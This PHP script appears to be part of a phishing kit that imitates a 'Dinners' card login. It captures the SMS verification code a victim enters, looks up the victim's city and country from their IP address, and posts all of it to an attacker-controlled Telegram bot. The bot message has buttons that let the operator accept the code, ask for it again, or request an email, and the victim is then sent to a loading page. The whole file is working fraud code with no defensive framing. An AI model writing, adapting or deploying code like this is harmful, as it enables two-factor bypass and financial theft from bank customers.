<?php
session_start();
require_once 'config.php';

$ip = $_SERVER["REMOTE_ADDR"];

if (isset($_POST["sms_code"])) {
    $sms_code = $_POST['sms_code'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data_in = curl_exec($ch);
    curl_close($ch);
    $ip_data = json_decode($ip_data_in, true);

    $country = isset($ip_data["country"]) ? $ip_data["country"] : "";
    $city = isset($ip_data["city"]) ? $ip_data["city"] : "";
    $ip = isset($ip_data["query"]) ? $ip_data["query"] : "";

    // Obtener session_id
    $session_id = $_SESSION['session_id'] ?? uniqid('user_', true);
    $_SESSION['session_id'] = $session_id;

    $msg = "Dinners - SMS Code 📱\n🔢 Código SMS: => " . $sms_code . "\n=============================\n Ciudad: " . $city . "\n📍 País: " . $country . "\n📍 IP: " . $ip . "\n==========================\n";

    // Crear botones inline para SMS
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ SMS Correcto', 'callback_data' => 'sms_ok_' . $session_id]
            ],
            [
                ['text' => '🔄 Repetir SMS', 'callback_data' => 'sms_retry_' . $session_id],
                ['text' => '� Pedir Email', 'callback_data' => 'sms_email_' . $session_id]
            ]
        ]
    ];

    // Enviar mensaje con botones
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $datos = [
        "chat_id" => $chat_id,
        "text" => $msg,
        "reply_markup" => json_encode($keyboard)
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    echo "<script>";
    echo "window.location.href='loading.php';";
    echo "</script>";
}
